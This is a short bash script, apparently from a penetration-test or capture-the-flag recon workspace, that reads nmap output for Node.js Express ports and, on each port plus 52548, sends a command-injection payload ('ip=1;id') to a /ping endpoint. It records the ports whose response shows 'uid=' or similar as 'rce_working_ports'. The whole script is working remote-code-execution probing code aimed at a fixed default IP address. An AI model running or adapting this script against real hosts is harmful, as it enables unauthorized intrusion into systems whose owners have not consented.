#!/usr/bin/env bash
set -euo pipefail
IP=${1:-94.237.49.23}
NMAP_FILE=${2:-/workspace/recon/nmap/tcp_full.nmap}
TO=8
OUT_DIR=/workspace/recon/httpx
TMP_DIR=/workspace/recon/tmp
mkdir -p "$OUT_DIR" "$TMP_DIR"
# Extract proper Node.js Express ports
PORTS=$(rg "Node\.js Express framework" -S "$NMAP_FILE" | awk '{print $1}' | cut -d/ -f1 | sort -n | uniq)
PORTS="$PORTS 52548"
: > "$OUT_DIR/rce_working_ports.txt"
for p in $PORTS; do
  # probe index quickly
  curl -fsS -m "$TO" --connect-timeout "$TO" -s "http://$IP:$p/" | head -n 10 > "$OUT_DIR/port_${p}_index.head" || true
  # test RCE by id
  RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip=1;id" "http://$IP:$p/ping" || true)
  echo "$RES" | head -n 5 > "$OUT_DIR/port_${p}_rce_test.txt"
  if echo "$RES" | grep -qiE "uid=|www-data|linux"; then
    echo "$p" | tee -a "$OUT_DIR/rce_working_ports.txt"
  fi
  # be polite
  sleep 0.2
done
cat "$OUT_DIR/rce_working_ports.txt"
